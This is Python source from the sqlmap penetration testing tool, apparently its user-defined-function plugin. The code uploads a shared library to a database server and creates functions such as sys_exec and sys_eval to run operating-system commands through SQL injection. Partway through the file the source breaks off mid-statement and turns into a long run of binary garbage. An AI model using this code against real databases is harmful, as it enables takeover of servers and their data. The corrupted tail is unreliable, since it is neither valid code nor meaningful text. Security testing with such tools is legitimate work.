#!/usr/bin/env python2

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import checkFile
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.exception import SqlmapUserQuitException
from lib.core.unescaper import unescaper
from lib.request import inject

class UDF:
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf = set()
        self.udfs = {}
        self.udfToCreate = set()

    def _askOverwriteUdf(self, udf):
        message = "UDF '%s' already exists, do you " % udf
        message += "want to overwrite it? [y/N] "

        return readInput(message, default='N', boolean=True)

    def _checkExistUdf(self, udf):
        logger.info("checking if UDF '%s' already exist" % udf)

        query = agent.forgeCaseStatement(queries[Backend.getIdentifiedDbms()].check_udf.query % (udf, udf))
        return inject.getValue(query, resumeValue=False, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY)

    def udfCheckAndOverwrite(self, udf):
        exists = self._checkExistUdf(udf)
        overwrite = True

        if exists:
            overwrite = self._askOverwriteUdf(udf)

        if overwrite:
            self.udfToCreate.add(udf)

    def udfCreateSupportTbl(self, dataType):
        debugMsg = "creating a support table for user-defined functions"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)

    def udfForgeCmd(self, cmd):
        if not cmd.startswith("'"):
            cmd = "'%s" % cmd

        if not cmd.endswith("'"):
            cmd = "%s'" % cmd

        return cmd

    def udfExecCmd(self, cmd, silent=False, udfName=None):
        if udfName is None:
            udfName = "sys_exec"

        cmd = unescaper.escape(self.udfForgeCmd(cmd))

        return inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)

    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
        if udfName is None:
            udfName = "sys_eval"

        if conf.direct:
            output = self.udfExecCmd(cmd, udfName=udfName)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    new_output += line.replace("\r", "\n")

                output = new_output
        else:
            cmd = unescaper.escape(self.udfForgeCmd(cmd))

            inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
            output = unArrayizeValue(inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False))
            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        return output

    def udfCheckNeeded(self):
        if (not conf.fileRead or (conf.fileRead and not Backend.isDbms(DBMS.PGSQL))) and "sys_fileread" in self.sysUdfs:
            self.sysUdfs.pop("sys_fileread")

        if not conf.osPwn:
            self.sysUdfs.pop("sys_bineval")

        if not conf.osCmd and not conf.osShell and not conf.regRead:
            self.sysUdfs.pop("sys_eval")

            if not conf.osPwn and not conf.regAdd and not conf.regDel:
                self.sysUdfs.pop("sys_exec")

    def udfSetRemotePath(self):
        errMsg = "udfSetRemotePath() method must be defined within the plugin"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfSetLocalPaths(self):
        errMsg = "udfSetLocalPaths() method must be defined within the plugin"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfCreateFromSharedLib(self, udf=None, inpRet=None):
        errMsg = "udfCreateFromSharedLib() method must be defined within the plugin"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfInjectCore(self, udfDict):
        written = False

        for udf in udfDict.keys():
            if udf in self.createdUdf:
                continue

            self.udfCheckAndOverwrite(udf)

        if len(self.udfToCreate) > 0:
            self.udfSetRemotePath()
            checkFile(self.udfLocalFile)
            written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary", forceCheck=True)

            if written is not True:
                errMsg = "there has been a problem uploading the shared library, "
                errMsg += "it looks like the binary file has not been written "
                errMsg += "on the database underlying file system"
                logger.error(errMsg)

                message = "do you want to proceed anyway? Beware that the "
                message += "operating system takeover will fail [y/N] "

                if readInput(message, default='N', boolean=True):
                    written = True
                else:
                    return False
        else:
            return True

        for udf, inpRet in udfDict.items():
            if udf in self.udfToCreate and udf not in self.createdUdf:
                self.udfCreateFromSharedLib(udf, inpRet)

        if Backend.isDbms(DBMS.MYSQL):
            supportTblType = "longtext"
        elif Backend.isDbms(DBMS.PGSQL):
            supportTblType = "text"

        self.udfCreateSupportTbl(supportTblType)

        return written

    def udfInjectSys(self):
        self.udfSetLocalPaths()
        self.udfCheckNeeded()
        return self.udfInjectCore(self.sysUdfs)

    def udfInjectCustom(self):
        if Backend.getIdentifiedDbms() not in (DBMS.MYSQL, DBMS.PGSQL):
            errMsg = "UDF injection feature only works on MySQL and PostgreSQL"
            logger.error(errMsg)
            return

        if not isStackingAvailable() and not conf.direct:
            errMsg = "UDF injection feature requires stacked queries SQL injection"
            logger.error(errMsg)
            return

        self.checkDbmsOs()

        if not self.isDba():
            warnMsg = "functionality requested probably does not work because "
            warnMsg += "the current session user is not a database administrator"
            logger.warn(warnMsg)

        if not conf.shLib:
            msg = "what is the local path of the shared library? "

            while True:
                self.udfLocalFile = readInput(msg)

                if self.udfLocalFile:
                    break
                else:
                    logger.warn("you need to specify the local path of the shared library")
        else:
            self.udfLocalFile = conf.shLib

        if not os.path.exists(self.udfLocalFile):
            errMsg = "the specified shared library file does not exist"
            raise SqlmapFilePathException(errMsg)

        if not self.udfLocalFile.endswith(".dll") and not self.udfLocalFile.endswith(".so"):
            errMsg = "shared library file must end with '.dll' or '.so'"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".so") and Backend.isOs(OS.WINDOWS):
            errMsg = "you provided a shared object as shared library, but "
            errMsg += "the database underlying operating system is Windows"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".dll") and Backend.isOs(OS.LINUX):
            errMsg = "you provided a dynamic-link library as shared library, "
            errMsg ��'�.�����[ ����|
�� ��"�[  ��im��� �-��[  ����K�� �N��[  ����� �;��[  ���s<� �
(�[  ��d��� ��,�[  X ��� �rp@  ��zg.�� �ڡ\  ���Gǃ� �
u\  ��|<1�� ��|\  ��;�n� PY'\  ���=�/� ���'\  ��)g�� �q��> �5�(<H� �_�3\  ��cGFb� УP?\  ��]�9� �̝I\  ��L�^� �9Q\  ��\C�� ��]\ ��1���P� �իi\ ���SO� ��,�>  X �� �� �ë@  X 0n�� з@  ���>�w� �u/u\  ��|k�� ��m�\  ���Am�� о�\  ���~}+� �M7�\  �� =<�� ����\  ��3�Ӊ� �6��\  ����� � Ў�\  ���� �q�\  ��R��� ��\ �R3�AV0 �ɲ�E �S5і����
V�\ ţ7�!��� ���\  ���NY�� Юg�\  ������� �3]  ��C�{�� �w�]  ����-�� �}�]  ����
�� �,�(]  ��v�� � �^ 4]  ��m�� С��> �t6��h����J@] ������ ����E ��B9� � ��E ����Ӭ ���E ����J� И&�E ����� �	�E B����� Є{�E B�����H �*y�E R���D�O ��k�E r����� ЗR�E ������9 л��E ���I�Hr �X��E b��Ԛ�� � 8�E ���أVn �M��E ���ЛBy ��V�E �����F% Ѝ�E b��e$|� ����E ��x��� ��_�E ���LER� ��s�E R����� �I��E ���j�p Ё��E ����v�� Ќ��E ����G+� С��E b����� ��
�E b�����{ ���E ���"@ss �t��E ���)�ƚ Љ�E ���k�� Ў�E #����Cr �h��E ���7�� ���E ���o;M �1��E ����W�� �N��E ���ik� ��V�E R���r�� кR�E R���� �ǩ�E R��I-� б�E R����� й��E �����{ ЋS�E R����	 Я��E ����˱e �k8�E ����� �=�E R��l� �|Z�E ���� �s~�E B��#��� ���E b��Y�C й��E ��׶�( Ѓ�E ����4P ��0�E B��n�$ �N(�E R��O9�9 �e�E ���-/ ��o�E R��da�� ��Y�E ���	<�� �c��E xs0�C�����s�L]  ��u�U�� �L�X]  ���Ź�� ��d] ����Yz� �9To  ���,Q�� �3�o] D�5��|��@�C�w] *S3�dV� Ќ̓] "�5YF�� �� �]  ��$���� Яڛ]  ��ù�E� и��]  ���U��� М{�]  ���v��� �ܴ�]  ��6���� ����] ��5��>��@�=��]  ���ZHX� Є
�]  ��3��� �D�]  ������ �D��]  ��t���� И�^  ��C��� �`�^  ��H��� Н�^ �3mr������+^  ���h�� �b�7^  ��3<�W� �i�C^  ��-� �� �P:O^  ��^j�� �*[^  ��l��� �5�g^  ���K[y �,��E  ��D�t PȜs^ ���f#�F �¿>  X >��� М�@  ��Z1�H е��>  H >�� �i�@ �2�a�� �6k^ Xs4�f��� Т��^ �28֎ļ� �녋^ �S6~&��� Ч��^ �b2����@�	�^ �9# ���`�ޏ�^  X �-o.� ����<  X T�L� �,U�< �R4��F� Д»^ �c5���������^ ��~zI �
\�> �1zҾn� �p�^  X �_.� Аq�< ��Qw �"�E �����-� Ц��>  ��|��� �ya�^  ����^�� з�>  ���]=�� �Ց�^  ���b��� �%,�^  ����^�� ����^ f�5�uZ��`���_ �45���-  �Њ_ A�)�{�~� ��s_  ����� �W'_  ��<y�� �ӂ3_  ��C�V� ��?_ Hu5n�ؘ ��WK_  ��ȋ��� з^W_  ���[�� �2�o  ���_ �V��>  ���Z^�� �Fqc_  ������ �Weo_  X ��� �H�z_  X :c�� ��@  X �[.� �W��<  X �s�� л�<>  X 0��� �q@@  ���F��� �R�_  ��j�� ��h�_  ���`+�� й��_  ���=��� Ћ��_  ��΄�� ��Q�_  ��@5� �y��_  ������ �D��_  ������ � ��_  ���&�� ��=�_  ���<Ec� �7x�_  ��_+�� �`��_  ��)���� Т��^  X ���L� �Qh�<  ���p��� К�>  ����� ��'`  ��
� �� �Ru`  ������� ��-`  ����p] ��>  X ��Y�� ��x�<  ���gW�� ��c*`  X ��$�� М�@  X w��� Њ@  X .P��� С��<  X ��H� �mN�<  X ���� ���<  ���B� �B��>  ������ �ή�>  ���	�� P�v4`  ��P�b�� �ʴ@` ZS4��& Ы�E  ��B��� �r�L`  ���)�- ���E  ��01[�� �J�X`  ������Ǟ[d` /3 Fѱ� �jp` b��CxL Љ��E R���.IZ �G��E  ��6�8&� ��	o  ��d��� �':|`  ��5cѤ� �a�` ��6� �f��`  ���A� �65�> ��� , �;��E ��7�f� �0h�` :S.�v������`  ��m�ra� �rI�`  ����e�� �<�` ��9������L��` ,37��� ����` B�5e�>d� �m��` �S9{�]� �@i�`  X -DQ.� ���<  ���ѓ� P��`  ���9� �u�`  ��çI" Џ�uY  ��i�� Щ��`  X �Z-�� �Z�<>  ��=Xxa� е}�`  ��3��d� ��Zo  ��Ŏ�@� Ыa  ���%'G� �i�a  ���Y+S� �̆a  ������ ��`'a  �� .�� �~2a  ��F�� �*3�>  ������� �w�>a  ����5� Ј�Ia  ���� =� ��Ua  I�/�j �[�_a JS5(5V��`��wka  ��=�hz� ��wa  ��ix�k� г�a  ������ Зގa 7�4M�iO Ѕ��a �f9Ww�� ���a 5�6x�+����j��a 2�6h�� �*G�a =#8�3�� ���a 9d0�NGB� м��a N3U�r�� �M$�a  ����(�� БP�a �2�MMW� �}�a  ���*�� ��8�a  ����;�� ��M�a �6�p�� Ѓe�a �R7�V����4K
b �g��8w� ��wo  �e� ��s�7�b x��;������4"b  ���i� Њٿ> jS5����� ��,b �6a�n5� �rN7b q�4A�/�� �z�Cb KC-ɯ�����7b ��5}>�� ���Ob �#2���{� � Ob %�3��[a� �#Zb n9���^� �WBZb  ���� �ߟ�>  ���Ք�� Л��a  ��m��� �*�eb  ������ �g�pb  ���qP  Юo ��5e���� Н"|b  ��#& x P�·b ���LW)_ �%�>  ��6��2� �S�b  �����K� �x$�b  ��φ�� ���b  ��>j�� Д~�b  ��^�.o� ��?�b  ��YK�� ��> �g���'� �YY�> /9�`1����~/�b 1�4��z� �x_�b �4:)�����֑�b ��3�-�2� �9��b  ��U�ݚ� ���b ��5Z�=�� �wc
c  ��B& P��c  ��m	�� �~Zc ���wË" P��!c ח�+�4� ��>  ���I\b� п7-c �6�]� ���8c  ����� �krCc  ������ ���Oc  ����� ��$[c  ���Zz� ���fc  �� ��� �r7rc  ������ ��~c  ���ɟ�� �'�c  ���>+�� �e �c KD|�5�����D�c �#3H �����-��c �R0r���������c �s3�x�� � �c  ��G�u� �o��c  ��c�� �n��c 7�8x�I|� ��0�c ��4��^� �
�c ;C2���t� �)��c  ���{��� ����c  ������� �_�	d  ��F�)� ��Qd  ���@��� Бc d �B5൱��ˬ�,d R�8y*�t� �|�8d a�5y�_�� ШDd ��f$�� �s+�>  ��K H�� ��'Pd  ��[�H�� �%�[d  ��]n�V� �@�gd $7u=��� �20rd (t9�#ث� Д�}d  ������ Р��>  ���J�[� �Mڈd  ��c�8�� ��r�d ��7�p_�� �_̟d ��3fc�u� �ո�d \36ㄘ� ����d  ��M�� �p��d  ���q'�� �00�d  ��X�[� ����d  ��Nx*i� ��G�d  ��ʀ�� ���d  ��x��{� ��<�d �����6# �*�> �R8�5�]� �\�e ��: ��.� �v)e ��/��u� ГR e  ��v��?� ��(,e  ��M�f� P�7e ��1t5��� �*�Ce  ���p� �A�Ne ����c� �}	Ne  ����-� ��>  ��*�Na �8�> �G�?�U< ���Ye "���� ���>  ����I� ���be 9d4*M��� ��me �5�� ���xe :���{G� �eD�> �T4_�f�� �Ά�e  �� �
 P�Îe  ��/��� м"o  ��@�u� еZ�e  ��b�?�� ��%�e  �����Z� �
 �e  ������ �O�e �6��b����%��e Q�8�WOu� �s:�e  ��j� �� �0��e  ���vZ� �y��e  ������� Ђ��e  ��&k��� �/bf  ����Ml� ���f  ����� �2�f  ���d�� ��&f  ��Ý��� �1f q�2��/t� ��\<f ;C6�}E������Hf  ���j�{	 �}A�>  ��h%H� н#Sf  ��`�$�� �k�^f  ��z_s� �Zif  ��܂%�� �u�uf  ���o�� ���f  ���J��6 Ѓ��f  ����U�� �儍f  ���m�f� ���f  ����0�� ЋH�f  ��ހ&�� �"1�f �S4��4� �׷�f  ��HZ��� Уj�f ��2I�p�� �'��f ��7}�@�� �j��f o7�D��������f �s4ІH� P�u�f  �